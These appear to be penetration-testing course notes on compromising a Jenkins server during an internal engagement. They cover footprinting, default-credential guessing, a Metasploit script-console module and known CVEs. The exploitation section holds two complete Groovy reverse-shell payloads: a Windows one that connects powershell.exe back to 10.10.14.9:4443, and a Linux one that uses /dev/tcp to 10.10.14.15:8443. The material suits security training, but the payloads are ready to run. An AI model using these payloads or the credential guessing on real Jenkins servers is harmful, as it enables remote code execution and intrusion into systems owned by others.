### Footprinting + Enumeration
```bash
curl -s http://app-dev.inlanefreight.local:8000/ | grep Jenkins
```
Let's assume we are working on an internal penetration test and have completed our web discovery scans. We notice what we believe is a Jenkins instance and know it is often installed on Windows servers running as the all-powerful SYSTEM account. If we can gain access via Jenkins and gain remote code execution as the SYSTEM account, we would have a foothold in Active Directory to begin enumeration of the domain environment.

Jenkins runs on Tomcat port 8080 by default. It also utilizes port 5000 to attach slave servers. This port is used to communicate between masters and slaves. Jenkins can use a local database, LDAP, Unix user database, delegate security to a servlet container, or use no authentication at all. Administrators can also allow or disallow users from creating accounts.

### Exploitation
#### Password spraying
We may encounter a Jenkins instance that uses weak or default credentials such as `admin:admin` or does not have any type of authentication enabled. It is not uncommon to find Jenkins instances that do not require any authentication during an internal penetration test.
#### RCE via Script Console
Metasploit module
```
use exploit/multi/http/jenkins_script_console
```
Windows reverse shell
```groovy
String host="10.10.14.9";
int port=4443;
String cmd="powershell.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
Linux
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

#### Known Vulnernabilities
One recent exploit combines two vulnerabilities, CVE-2018-1999002 and [CVE-2019-1003000](https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266) to achieve pre-authenticated remote code execution, bypassing script security sandbox protection during script compilation. Public exploit PoCs exist to exploit a flaw in Jenkins dynamic routing to bypass the Overall / Read ACL and use Groovy to download and execute a malicious JAR file. This flaw allows users with read permissions to bypass sandbox protections and execute code on the Jenkins master server. This exploit works against Jenkins version 2.137
